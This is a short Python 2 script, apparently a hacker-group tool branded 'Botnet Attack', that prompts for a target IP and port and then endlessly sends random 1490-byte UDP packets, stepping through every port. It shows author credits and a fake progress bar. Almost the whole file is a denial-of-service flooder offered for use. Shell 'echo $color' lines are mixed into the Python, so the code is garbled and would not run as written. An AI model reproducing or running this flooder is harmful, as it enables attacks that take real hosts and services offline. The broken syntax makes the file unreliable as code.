import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet Botnet Attack")
print
echo $red "Author   : 5H311_1NJ3C706"
echo $lime "You Tube : https://www.youtube.com/channel/UCIMivWDElHbU15xnxW1RShw"
echo $lime "github   : https://github.com/DarkNet-Hacker-Team"
echo $lime "Facebook : https://www.facebook.com/kevin.malware.5"
echo $red
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack")
echo $red "[                    ] 0% "
time.sleep(5)
echo $lime "[=====               ] 25%"
time.sleep(5)
echo $red "[==========          ] 50%"
time.sleep(5)
echo $lime "[===============     ] 75%"
time.sleep(5)
echo $lime "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     echo $red "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

